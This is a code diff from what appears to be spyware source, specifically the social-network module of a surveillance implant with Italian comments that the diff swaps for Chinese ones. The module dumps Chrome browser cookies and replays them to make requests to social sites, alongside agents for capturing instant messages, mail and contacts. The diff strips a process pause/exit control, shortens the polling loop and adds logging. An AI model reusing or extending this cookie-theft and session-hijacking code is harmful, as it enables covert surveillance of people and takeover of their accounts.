@@ -31,7 +31,6 @@ extern int DumpCHCookies(void); // Cookie per Chrome
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL IsCrisisNetwork();
-extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale
 
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_MailCapStarted;
@@ -196,13 +195,6 @@ void DumpNewCookies()
 	DumpCHCookies();
 }
 
-void CheckProcessStatus()
-{
-	while(social_process_control == SOCIAL_PROCESS_PAUSE) 
-		Sleep(500);
-	if (social_process_control == SOCIAL_PROCESS_EXIT)
-		ExitProcess(0);
-}
 
 void InitSocialEntries()
 {
@@ -248,45 +240,31 @@ void SocialMainLoop()
 	static int itry = 0;
 	for (;;) {
 		// Busy wait...
-		for (int j=0; j<SLEEP_COOKIE; j++) {
-			if (!is_demo_version)
-				Sleep(1000);
-			else
-				Sleep(40);
-			CheckProcessStatus();
-		}
-// 		Sleep(3000);
-// 		itry++;
-// 		if (itry>3)
-// 			break;
-		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-// 		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
-// 			continue;
+		for (int j=0; j<SLEEP_COOKIE; j++) {Sleep(40);}
 
-		// Verifica se qualcuno e' in attesa di nuovi cookies
-		// o se sta per fare una richiesta
+		wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+		swprintf(szLogW, L"in SocialMainLoop after wait");
+		putlogW(szLogW);
+
+		//导出新cookie
 		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
-			// Se si, li dumpa
 			if (social_entry[i].wait_cookie || social_entry[i].idle == 0) {
 				DumpNewCookies();
 				break;
 			}
 		}
 
-		// Se stava aspettando un cookie nuovo
-		// e c'e', allora esegue subito la richiesta
+		//如果在等待一个新的cookie,并且现在有cookie，则立刻执行请求
 		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) 
 			if (social_entry[i].wait_cookie && social_entry[i].is_new_cookie) {
 				social_entry[i].idle = 0;
 				social_entry[i].wait_cookie = FALSE;
 			}
 		
+		// 执行新的请求
 		for (i=0; i<SOCIAL_ENTRY_COUNT; i++) {
-			// Vede se e' arrivato il momento di fare una richiesta per 
-			// questo social
 			if (social_entry[i].idle == 0) { 
 				char domain_a[64];
-				CheckProcessStatus();
 				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
  				if (str = GetCookieString(domain_a)) {
 					if (social_entry[i].RequestHandler)// !IsCrisisNetwork() && , rem by fhc
